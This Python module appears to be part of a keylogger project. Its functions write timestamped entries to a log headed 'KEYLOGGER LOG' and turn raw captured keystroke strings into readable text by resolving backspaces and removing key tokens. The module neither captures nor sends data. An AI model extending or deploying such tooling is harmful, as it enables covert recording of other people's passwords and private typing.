from datetime import datetime
import re
import os
from constants import LOGS_DIR 

def write_to_log(message: str, log_name: str) -> bool:
    """
    Writes a message to a log file.

    Args:
        message: The message to be written to the log file.
        log_name: The name of the log file.

    Returns:
        True if the message was successfully written to the log file, False otherwise.
    """
    try:
        log_path = os.path.join(LOGS_DIR, log_name)

        if not os.path.exists(LOGS_DIR):
            os.makedirs(LOGS_DIR)
            print("Directory {} created successfully!".format(LOGS_DIR))

        if not os.path.exists(log_path):
            with open(log_path, 'w') as f:
                f.write('---- KEYLOGGER LOG ----\n')

        with open(log_path, 'a') as f:
            f.write(message)

        return True
    except Exception as e:
        print(e)
        return False

def format_message(content: str) -> str:
    """
    Format a message with the current date and a separator.

    Args:
        content (str): The content of the message.

    Returns:
        str: The formatted message with the current date and separator.
    """
    date = 'DATE: {}'.format(datetime.today().strftime('%Y-%m-%d %H:%M:%S'))
    sep = '\n# ---------------------------------------------- #\n'

    return '{date}{sep}{content}{sep}\n'.format(date=date, content=content, sep=sep)


def process_keys(typed_keys):
    """
    Process the given string of typed keys and return a more legible version of it.

    Args:
        typed_keys (str): A string representing the typed keys.

    Returns:
        str: A string representing the processed keys.
    """

    processed_keys = re.sub(r'\[SPACE\]', ' ', typed_keys)
    processed_keys = re.sub(r'\[BACKSPACE\]', '^', processed_keys)
    processed_keys = re.sub(r'\[.*?\]', '', processed_keys)

    processed_keys = list(processed_keys)
    i = 0
    while i < len(processed_keys):
        if processed_keys[i] == '^':
            if i - 1 >= 0:
                processed_keys.pop(i-1)
                processed_keys.pop(i-1) 
                i -= 1  
            else:
                processed_keys.pop(i)  
        else:
            i += 1 

    return ''.join(processed_keys)